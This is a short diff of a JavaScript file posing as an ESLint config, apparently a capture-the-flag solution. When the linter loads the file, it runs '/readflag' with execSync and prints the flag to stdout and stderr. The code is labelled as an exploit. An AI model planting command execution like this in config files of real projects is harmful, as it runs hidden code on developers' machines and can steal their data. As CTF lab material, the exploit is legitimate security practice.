@@ -1,10 +1,13 @@
 const { execSync } = require('child_process');
+
 try {
+    console.log("--- ESLINT CONFIG EXPLOIT ---");
     const flag = execSync('/readflag').toString().trim();
-    console.log("!!!FLAG_START!!! " + flag + " !!!FLAG_END!!!");
-    // 同时也写到 stderr 以防 stdout 被吞
-    console.error("!!!FLAG_START!!! " + flag + " !!!FLAG_END!!!");
+    const msg = "!!!FLAG_START!!! " + flag + " !!!FLAG_END!!!";
+    console.log(msg);
+    console.error(msg);
 } catch (e) {
-    console.error(e);
+    console.error("[ESLINT CONFIG ERROR]", e.message);
 }
-module.exports = {};
+
+module.exports = [];
